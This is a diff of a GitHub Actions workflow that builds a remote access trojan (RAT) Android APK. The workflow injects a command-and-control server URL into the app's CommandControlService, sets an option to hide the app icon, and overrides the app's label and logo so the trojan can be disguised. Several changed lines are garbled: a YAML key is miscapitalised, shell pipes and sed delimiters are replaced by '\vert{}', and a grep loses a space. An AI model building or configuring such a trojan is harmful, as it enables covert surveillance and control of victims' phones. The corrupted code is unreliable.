@@ -1,4 +1,4 @@
-name: Build RAT APK
+Name: Build RAT APK
 
 on:
   workflow_dispatch:
@@ -63,11 +63,13 @@ jobs:
 
       - name: Setup Android SDK
         uses: android-actions/setup-android@v3
+        with:
+          cmdline-tools-version: 11076708
+          accept-android-sdk-licenses: true
 
       - name: Install build-tools 34.0.0
         run: sdkmanager "build-tools;34.0.0" "platforms;android-34"
 
-      # ── Fix local.properties — committed file has Windows paths ───────────
       - name: Fix local.properties for CI
         run: |
           echo "sdk.dir=$ANDROID_SDK_ROOT" > android/local.properties
@@ -79,14 +81,14 @@ jobs:
       - name: Inject C2 URL into CommandControlService
         run: |
           URL="${{ github.event.inputs.c2_url }}"
-          sed -i "s|public static final String SERVER_URL = \"[^\"]*\";|public static final String SERVER_URL = \"${URL}\";|g" "${{ env.CCS }}"
+          sed -i "s|public static final String SERVER_URL = \"[^\"]*\";|public static final String SERVER_URL = \"${URL}\";\vert{}g" "${{ env.CCS }}"
           grep -q "SERVER_URL = \"${URL}\"" "${{ env.CCS }}" || { echo "::error::C2 URL injection failed"; exit 1; }
-          echo "Injected: $(grep 'SERVER_URL =' ${{ env.CCS }} | head -1)"
+          echo "Injected: $(grep 'SERVER_URL ='${{ env.CCS }} | head -1)"
 
       - name: Set HIDE_ICON
         run: |
           HIDE="${{ github.event.inputs.hide_icon }}"
-          sed -i "s|public static final boolean HIDE_ICON = [^;]*;|public static final boolean HIDE_ICON = ${HIDE};|g" "${{ env.CCS }}"
+          sed -i "s|public static final boolean HIDE_ICON = [^;]*;|public static final boolean HIDE_ICON = ${HIDE};\vert{}g" "${{ env.CCS }}"
 
       - name: Override app label
         if: ${{ github.event.inputs.app_label != '' }}
@@ -107,7 +109,7 @@ jobs:
           set -euo pipefail
           TMP_LOGO="/tmp/builder_logo.png"
           if [ -n "${{ github.event.inputs.logo_base64 }}" ]; then
-            echo "${{ github.event.inputs.logo_base64 }}" | base64 --decode > "$TMP_LOGO"
+            echo "${{ github.event.inputs.logo_base64 }}" \vert{} base64 --decode > "$TMP_LOGO"
           else
             curl -fsSL "${{ github.event.inputs.logo_url }}" -o "$TMP_LOGO"
           fi
@@ -167,7 +169,6 @@ jobs:
           restore-keys: |
             ${{ runner.os }}-gradle-
 
-      # ── Build — full output visible, error summary on failure ─────────────
       - name: Build release APK
         working-directory: android
         run: |
